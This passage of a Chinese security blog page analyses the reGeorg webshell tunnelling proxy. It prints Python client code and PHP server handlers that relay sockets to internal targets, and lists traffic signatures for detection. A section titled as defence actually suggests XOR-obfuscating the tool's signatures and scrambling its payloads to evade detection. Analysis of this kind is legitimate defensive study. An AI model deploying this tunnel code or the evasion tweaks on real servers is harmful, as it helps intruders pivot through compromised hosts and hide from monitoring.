class="built_in">len</span>(data)))</span><br><span class="line">        <span class="keyword">except</span> timeout:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">except</span> Exception, ex:</span><br><span class="line">            <span class="keyword">raise</span> ex</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    self.closeRemoteSession()</span><br><span class="line">    log.debug(<span class="string">&quot;Closing localsocket&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        self.pSocket.close()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        log.debug(<span class="string">&quot;Localsocket already closed&quot;</span>)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>之后会根据本地程序的操作是否结束而进入读写循环，若数据交互结束则通过<code>DISCONNECT</code>结束代理连接。</p>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">closeRemoteSession</span>(<span class="params">self</span>):</span><br><span class="line">    headers = &#123;<span class="string">&quot;X-CMD&quot;</span>: <span class="string">&quot;DISCONNECT&quot;</span>, <span class="string">&quot;Cookie&quot;</span>: self.cookie&#125;</span><br><span class="line">    params = <span class="string">&quot;&quot;</span></span><br><span class="line">    conn = self.httpScheme(host=self.httpHost, port=self.httpPort)</span><br><span class="line">    response = conn.request(<span class="string">&quot;POST&quot;</span>, self.httpPath + <span class="string">&quot;?cmd=disconnect&quot;</span>, params, headers)</span><br><span class="line">    <span class="keyword">if</span> response.status == <span class="number">200</span>:</span><br><span class="line">        log.info(<span class="string">&quot;[%s:%d] Connection Terminated&quot;</span> % (self.target, self.port))</span><br><span class="line">    conn.close()</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h4 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h4><p>官方原生代码脚本中根据可能的服务端环境给出了多个版本的服务端脚本。这里以<code>PHP</code>脚本为例：</p>
+<ol>
+<li><p>首先设置相关功能需要的环境条件，如开启文件包含文件引用,导入socket：</p>
+ <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;allow_url_fopen&quot;</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;allow_url_include&quot;</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="title function_ invoke__">dl</span>(<span class="string">&quot;php_sockets.dll&quot;</span>);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>接收到请求后根据<code>GET</code>类型和<code>POST</code>类型判断是否为新客户端请求询问服务端是否正常，并返回消息。</p>
+ <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;GET&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;Georg says, &#x27;All seems fine&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>根据<code>CONNECT</code>请求中的<code>targetIP</code>和<code>port</code>参数与其建立<code>socket</code>连接。</p>
+ <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>(<span class="variable">$cmd</span>)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;CONNECT&quot;</span>:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$target</span> = <span class="variable">$headers</span>[<span class="string">&quot;X-TARGET&quot;</span>];</span><br><span class="line">            <span class="variable">$port</span> = (<span class="keyword">int</span>)<span class="variable">$headers</span>[<span class="string">&quot;X-PORT&quot;</span>];</span><br><span class="line">            <span class="variable">$sock</span> = <span class="title function_ invoke__">socket_create</span>(AF_INET, SOCK_STREAM, SOL_TCP);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$sock</span> === <span class="literal">false</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="title function_ invoke__">header</span>(<span class="string">&#x27;X-STATUS: FAIL&#x27;</span>);</span><br><span class="line">                <span class="title function_ invoke__">header</span>(<span class="string">&#x27;X-ERROR: Failed creating socket&#x27;</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = @<span class="title function_ invoke__">socket_connect</span>(<span class="variable">$sock</span>, <span class="variable">$target</span>, <span class="variable">$port</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$res</span> === <span class="literal">false</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="title function_ invoke__">header</span>(<span class="string">&#x27;X-STATUS: FAIL&#x27;</span>);</span><br><span class="line">                <span class="title function_ invoke__">header</span>(<span class="string">&#x27;X-ERROR: Failed connecting to target&#x27;</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title function_ invoke__">socket_set_nonblock</span>(<span class="variable">$sock</span>);</span><br><span class="line">            @<span class="title function_ invoke__">session_start</span>();</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&quot;run&quot;</span>] = <span class="literal">true</span>;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&quot;writebuf&quot;</span>] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&quot;readbuf&quot;</span>] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            ···</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>服务端得到客户端发送的<code>READ</code>读取指令后，读取<code>socket</code>数据。</p>
+ <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">&quot;READ&quot;</span>:</span><br><span class="line">&#123;</span><br><span class="line">    @<span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="variable">$readBuffer</span> = <span class="variable">$_SESSION</span>[<span class="string">&quot;readbuf&quot;</span>];</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&quot;readbuf&quot;</span>]=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="variable">$running</span> = <span class="variable">$_SESSION</span>[<span class="string">&quot;run&quot;</span>];</span><br><span class="line">    <span class="title function_ invoke__">session_write_close</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$running</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;X-STATUS: OK&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Connection: Keep-Alive&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$readBuffer</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;X-STATUS: FAIL&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;X-ERROR: RemoteSocket read filed&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>服务器接收到<code>FORWARD</code>数据后，从客户端请求中获取到响应数据发送给前面建立好的<code>Socket</code>服务。</p>
+ <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">&quot;FORWARD&quot;</span>:</span><br><span class="line">    &#123;</span><br><span class="line">        @<span class="title function_ invoke__">session_start</span>();</span><br><span class="line">        <span class="variable">$running</span> = <span class="variable">$_SESSION</span>[<span class="string">&quot;run&quot;</span>];</span><br><span class="line">        <span class="title function_ invoke__">session_write_close</span>();</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$running</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&#x27;X-STATUS: FAIL&#x27;</span>);</span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&#x27;X-ERROR: No more running, close now&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: application/octet-stream&#x27;</span>);</span><br><span class="line">        <span class="variable">$rawPostData</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$rawPostData</span>) &#123;</span><br><span class="line">            @<span class="title function_ invoke__">session_start</span>();</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&quot;writebuf&quot;</span>] .= <span class="variable">$rawPostData</span>;</span><br><span class="line">            <span class="title function_ invoke__">session_write_close</span>();</span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&#x27;X-STATUS: OK&#x27;</span>);</span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&quot;Connection: Keep-Alive&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&#x27;X-STATUS: FAIL&#x27;</span>);</span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&#x27;X-ERROR: POST request read filed&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h3 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h3><p>由对该工具的流量特征总结我们可以知道原生版本的固定特征值，以及其工具完全建立在<code>http</code>协议下，只需要针对<code>http</code>的流量进行相关特征值的检测即可判断是否为原生版本<code>reGeorg</code>。</p>
+<p>其次，由于该工具对代理的数据是纯明文传输。且最终的目的<code>IP</code>和<code>port</code>会被放到参数中，我们可以检测参数中是否存在连续的明文<code>IP</code>和<code>port</code>以及<strong>可能存在的明文形式的协议格式数据或者攻击payload</strong>来检测判断。</p>
+<h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><p>首先是固定的特征值，考虑到特征值数量很少且长度不长，可以用<code>password</code>设置<code>randseed</code>的方式，<strong>让服务端和客户端分别在本地生成相同的随机数序列，然后将特征值与随机数异或的结果作为传输数据</strong>，即不影响传输效率，也可混淆特征值的存在。</p>
+<p>其次，关于目标代理数据明文传输的问题，我们可以自行设置数据处理算法对其进行混淆判断即可。<br>也可以考虑添加脏数据的方式，不过考虑到工具的传输效率问题，不推荐使用脏数据的方式。</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                </ul>
+            
+        </div>
+        
+        
+    <div id="gitalk-container" class="comment link"
+		data-enable="true"
+        data-ae="true"
+        data-ci="5cd24ed310c0cbc2a2ed"
+        data-cs="51aa998e509794b7b061784f1f3d41018af118f6"
+        data-r="xikong-mubai.github.io"
+        data-o="xikong-mubai"
+        data-a="xikong-mubai"
+        data-d="false"
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class="side">
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF"><span class="toc-number">1.1.</span> <span class="toc-text">隧道代理技术</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%82%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-number">1.2.</span> <span class="toc-text">适用场景</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#reGeorg"><span class="toc-number">2.</span> <span class="toc-text">reGeorg</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E6%B5%81%E7%A8%8B"><span class="toc-number">2.1.</span> <span class="toc-text">工作原理流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E6%80%BB%E7%BB%93"><span class="toc-number">2.2.</span> <span class="toc-text">流量特征总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%9F%E8%83%BD%E5%88%86%E6%9E%90"><span class="toc-number">2.3.</span> <span class="toc-text">功能分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF"><span class="toc-number">2.3.1.</span> <span class="toc-text">客户端</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF"><span class="toc-number">2.3.2.</span> <span class="toc-text">服务端</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E6%B5%8B"><span class="toc-number">2.4.</span> <span class="toc-text">检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1"><span class="toc-number">2.5.</span> <span class="toc-text">防御</span></a></li></ol></li></ol>
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+</body>
+
+<!--血小板代码-->
+<link rel="stylesheet" href="/live2d/css/live2d.css" />
+<div id="landlord">
+    <div class="message" style="opacity:0"></div>
+    <canvas id="live2d" width="280" height="250" class="live2d"></canvas>
+    <div class="hide-button">隐藏</div>
+</div>
+<script type="text/javascript" src="https://cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script type="text/javascript">
+    var message_Path = '/live2d/'
+    var home_Path = 'https://calmcenter.club/'
+</script>
+<script type="text/javascript" src="/live2d/js/live2d.js"></script>
+<script type="text/javascript" src="/live2d/js/message.js"></script>
+<script type="text/javascript">
+    loadlive2d("live2d", "/live2d/model/kesshouban_v2/model.json");
+</script>
+<!--血小板代码-->
+
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({"HTML-CSS": { preferredFont: "TeX", availableFonts: ["STIX","TeX"], linebreaks: { automatic:true }, EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50) },
+        tex2jax: { inlineMath: [ ["$", "$"], ["\\(","\\)"] ], processEscapes: true, ignoreClass: "tex2jax_ignore|dno",skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']},
+        TeX: {  noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } }, Macros: { href: "{}" } },
+        messageStyle: "none"
+    });
+</script>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script async type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.7/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+
+
+</html>
